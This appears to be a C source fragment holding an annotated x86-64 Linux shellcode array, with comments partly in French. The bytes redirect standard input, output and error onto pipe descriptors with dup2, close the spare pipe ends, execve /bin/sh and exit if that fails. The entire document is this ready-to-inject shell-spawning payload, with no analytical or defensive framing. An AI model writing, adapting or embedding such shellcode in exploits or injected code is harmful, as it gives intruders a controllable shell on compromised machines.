__attribute__((section(".text")))
static unsigned char shellcode[] =
  /* dup2(to_shell[0], 0) */
  "\x48\xc7\xc6\x00\x00\x00\x00"          /* mov rsi,0          */
  "\xb8\x21\x00\x00\x00"                  /* mov eax,33 dup2    */
  "\x0f\x05"                              /* syscall            */

  /* dup2(from_shell[1], 1) */
  "\x4c\x89\xc7"                          /* mov rdi,r8         */
  "\x48\xc7\xc6\x01\x00\x00\x00"          /* mov rsi,1          */
  "\xb8\x21\x00\x00\x00"
  "\x0f\x05"

  /* dup2(from_shell[1], 2) */
  "\x4c\x89\xc7"                          /* mov rdi,r8         */
  "\x48\xc7\xc6\x02\x00\x00\x00"          /* mov rsi,2          */
  "\xb8\x21\x00\x00\x00"
  "\x0f\x05"

  /* close(to_shell[1]) — FD en RDX */
  "\x48\x89\xd7"                          /* mov rdi,rdx        */
  "\xb8\x03\x00\x00\x00"                  /* mov eax,3 close    */
  "\x0f\x05"

  /* close(from_shell[0]) — FD en RCX */
  "\x48\x89\xcf"                          /* mov rdi,rcx        */
  "\xb8\x03\x00\x00\x00"
  "\x0f\x05"

  /* execve("/bin/sh", ["/bin/sh"], 0) */
  "\x48\x31\xd2"                                      /* xor rdx,rdx       */
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"          /* mov rbx,"/bin/sh" */
  "\x53"                                              /* push rbx          */
  "\x48\x89\xe7"                                      /* mov rdi,rsp       */
  "\x52"                                              /* push rdx (NULL)   */
  "\x57"                                              /* push rdi          */
  "\x48\x89\xe6"                                      /* mov rsi,rsp       */
  "\xb8\x3b\x00\x00\x00"                              /* mov eax,59 execve */
  "\x0f\x05"

  /* exit(1) si execve échoue */
  "\x48\xc7\xc7\x01\x00\x00\x00"
  "\xb8\x3c\x00\x00\x00"
  "\x0f\x05";